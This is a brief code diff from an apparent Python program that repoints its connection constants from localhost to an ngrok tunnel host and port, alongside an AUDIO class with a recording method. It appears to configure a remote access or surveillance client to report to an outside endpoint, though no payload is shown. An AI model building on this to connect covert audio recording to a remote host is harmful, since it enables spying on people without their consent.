@@ -8,8 +8,8 @@ try:
 except:
     HAVE_LIBS = False
 
-CONSTIP = "127.0.0.1"
-CONSTPT = 4000
+CONSTIP = "0.tcp.in.ngrok.io"
+CONSTPT = 18555
 
 class AUDIO:
     def record(self, seconds):
